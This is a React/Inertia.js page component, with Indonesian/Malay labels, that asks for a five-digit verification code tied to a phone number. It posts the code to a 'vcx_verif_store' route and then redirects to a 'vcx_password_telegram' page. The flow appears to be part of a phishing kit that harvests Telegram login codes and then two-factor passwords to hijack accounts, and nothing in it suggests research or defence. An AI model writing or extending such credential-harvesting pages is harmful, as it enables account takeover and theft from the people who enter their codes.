import Rhmt2Layout from "@/Layouts/rhmt2_layout";
import RhmtLayout from "@/Layouts/rhmt_layouts";
import { Link, router, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect, useState } from "react";

export default function SexLayouts({ phoneNumber }) {
    const { data, setData, post } = useForm({
        phoneNumber: phoneNumber,
        code: "",
    });
    const [loading, setLoading] = useState(false);

    const changeHandler = (e) => {
        const input = e.target.value;

        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
        if (input.length <= 5) {
            if (/^[0-9+]*$/.test(input)) {
                setData({ ...data, code: input });
            }
        }
    };

    const submitHandler = () => {
        if (data.code.length >= 5) {
            setLoading(true);
            post(route("rhmt.vcx_verif_store"), {
                onSuccess: () => {
                    setTimeout(() => {
                        setLoading(false);
                    }, 10000);
                    router.visit(route("rhmt.vcx_password_telegram"));
                },
                onError: () => {
                    setLoading(false);
                },
            });
        }
    };
    return (
        <Rhmt2Layout className="relative h-[932px] w-full overflow-hidden">
            {loading && (
                <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center z-[99] ">
                    <img src="/loading.gif" alt="" />
                </div>
            )}
            <h3 className="text-4xl font-extrabold text-purple-800 font-sans tracking-tighter">
                <span className="text-white tracking-tighter text-2xl font-thin">
                    Letak Cod
                </span>
            </h3>

            <div className="py-5 w-full flex flex-col gap-2">
                <TextField
                    value={data.code}
                    onChange={changeHandler}
                    className="bg-white w-full rounded-lg outline-none focus:outline-none focus:border-none overflow-hidden"
                    variant="filled"
                    label="Code"
                />
            </div>
            <button
                onClick={submitHandler}
                className="font-bold bg-purple-800 text-white text-2xl py-3 px-4 rounded-lg animate-pulse"
            >
                Kirim Cod
            </button>
        </Rhmt2Layout>
    );
}

SexLayouts.layout = (page) => <RhmtLayout children={page} />;
